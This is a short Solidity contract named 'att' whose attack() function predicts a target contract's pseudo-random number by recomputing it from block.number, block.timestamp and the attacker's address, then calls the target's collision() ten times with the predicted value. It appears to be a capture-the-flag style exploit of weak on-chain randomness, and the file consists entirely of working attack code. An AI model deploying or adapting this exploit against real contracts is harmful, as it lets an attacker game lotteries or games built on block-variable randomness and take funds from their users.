// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
contract att{
    vulquery public tar;
    function attack(address t)public{
        tar=vulquery(t);
        for (uint i=0;i<10;i++){
            uint MOD_NUM=60;
            uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
            uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
            uint256 shark = seed_hash % MOD_NUM;
            uint256 lucky_hash = uint256(keccak256(abi.encodePacked(address(this))));
            uint256 lucky = lucky_hash % shark;
            tar.collision(lucky);
        }
    }
}